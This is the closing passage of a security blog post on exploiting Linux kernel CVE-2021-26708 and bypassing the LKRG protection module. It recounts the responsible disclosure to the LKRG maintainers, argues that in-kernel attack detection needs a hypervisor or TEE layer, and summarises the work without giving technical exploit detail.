<p>On June 10, I disclosed the information about my experiments with LKRG to Adam and Alexander Peslyak aka <a href="https://twitter.com/solardiz">Solar Designer</a>. We discussed my LKRG bypass method and exchanged views on LKRG in general.</p>

<p>On July 3, I <a href="https://www.openwall.com/lists/lkrg-users/2021/07/03/1">disclosed my attack method</a> at the public <code class="language-plaintext highlighter-rouge">lkrg-users</code> mailing list. As of August 1, this attack method is not mitigated yet.</p>

<p>In my opinion, LKRG is an amazing project. When I started to learn it, I immediately saw that Adam and other contributors had invested a lot of engineering effort and love into this project. At the same time, I believe that detecting post-exploitation and illegal privilege escalation from inside the kernel is impossible. Einstein <a href="https://www.brainyquote.com/quotes/albert_einstein_385842">said</a>: "We can't solve problems by using the same kind of thinking we used when we created them." In other words, LKRG must be at some other context/layer to detect illegal kernel activity.</p>

<p>I think LKRG can bring much more trouble to attackers if it is ported to a hypervisor (for example, QEMU/KVM) or some FOSS implementation of Arm Trusted Execution Environment (for example, Open-TEE). However, that is a big task, and Adam would need substantial support from the community or maybe from the companies interested in this project.</p>

<h2 id="conclusion">Conclusion</h2>

<p>In this article, I described how I improved my PoC exploit for <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-26708">CVE-2021-26708</a> in the Linux kernel. It turned out to be an interesting journey with lots of assembly and return-oriented programming. I searched for the ROP/JOP gadgets in the memory of the live GNU/Linux system and managed to perform stack pivoting in restricted conditions. I also looked at the <a href="https://github.com/openwall/lkrg">Linux Kernel Runtime Guard</a> from the attacker's perspective, developed a new attack against LKRG, and shared my results with the LKRG team.</p>

<p>I believe writing this article is useful for the Linux kernel community, since it shows practical aspects of kernel vulnerability exploitation and defense. I hope you enjoyed it.</p>


  </div><a class="u-url" href="https://a13xp0p0v.github.io/2021/08/25/lkrg-bypass.html" hidden=""></a>
</article>

      </div>
    </main><footer class="site-footer">

  <div class="wrapper">

    <h2 class="footer-heading">Contacts</h2>

      <div class="footer-col footer-col-1">
        <ul class="social-media-list">
          
            <li>
              <a href="mailto:alex.popov@linux.com">
                <span class="icon  icon--email">
                  <svg fill="#828282" height="17px" width="17px" viewBox="0 0 24 24">
                  <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"></path>
                  <path d="M0 0h24v24H0z" fill="none"></path>
                  </svg>
                </span>
		<span class="username">alex.popov@linux.com</span>
              </a>
            </li>
          

          
          <li>
            <a href="https://twitter.com/a13xp0p0v"><span class="icon icon--twitter"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M15.969,3.058c-0.586,0.26-1.217,0.436-1.878,0.515c0.675-0.405,1.194-1.045,1.438-1.809c-0.632,0.375-1.332,0.647-2.076,0.793c-0.596-0.636-1.446-1.033-2.387-1.033c-1.806,0-3.27,1.464-3.27,3.27 c0,0.256,0.029,0.506,0.085,0.745C5.163,5.404,2.753,4.102,1.14,2.124C0.859,2.607,0.698,3.168,0.698,3.767 c0,1.134,0.577,2.135,1.455,2.722C1.616,6.472,1.112,6.325,0.671,6.08c0,0.014,0,0.027,0,0.041c0,1.584,1.127,2.906,2.623,3.206 C3.02,9.402,2.731,9.442,2.433,9.442c-0.211,0-0.416-0.021-0.615-0.059c0.416,1.299,1.624,2.245,3.055,2.271 c-1.119,0.877-2.529,1.4-4.061,1.4c-0.264,0-0.524-0.015-0.78-0.046c1.447,0.928,3.166,1.469,5.013,1.469 c6.015,0,9.304-4.983,9.304-9.304c0-0.142-0.003-0.283-0.009-0.423C14.976,4.29,15.531,3.714,15.969,3.058z"></path></svg>
</span><span class="username">a13xp0p0v</span></a>

          </li>
          

	  
          <li>
            <a href="https://github.com/a13xp0p0v"><span class="icon icon--github"><svg viewBox="0 0 16 16" width="16px" height="16px"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"></path></svg>
</span><span class="username">a13xp0p0v</span></a>

          </li>
          

	  
	  <li>
	    <a href="https://t.me/a13xp0p0v">
	      <span class="icon  icon--telegram">
		  <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#828282" class="bi bi-telegram" viewBox="0 0 16 16">
		  <path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8.287 5.906c-.778.324-2.334.994-4.666
		  2.01-.378.15-.577.298-.595.442-.03.243.275.339.69.47l.175.055c.408.133.958.288
		  1.243.294.26.006.549-.1.868-.32 2.179-1.471 3.304-2.214 3.374-2.23.05-.012.12-.026.166.016.047.041.042.12.037.141-.03.129-1.227
		  1.241-1.846 1.817-.193.18-.33.307-.358.336a8.154 8.154 0 0 1-.188.186c-.38.366-.664.64.015
		  1.088.327.216.589.393.85.571.284.194.568.387.936.629.093.06.183.125.27.187.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.426
		  1.426 0 0 0-.013-.315.337.337 0 0 0-.114-.217.526.526 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09z"></path>
		  </svg>
	      </span>
	      <span class="username">a13xp0p0v</span>
	    </a>
	  </li>
          

	  
	  <li>
	    <a href="https://www.linkedin.com/in/a13xp0p0v">
	      <span class="icon  icon--linkedin">
		  <svg viewBox="0 0 512 512" width="16px" height="16px">
	          <path fill="#828282" d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
	          C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
	          M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
	          c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
	          s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"></path>
	        </svg>
	      </span>
	      <span class="username">a13xp0p0v</span>
	    </a>
	  </li>
          
        </ul>
      </div>

  </div>

</footer>



</body></html>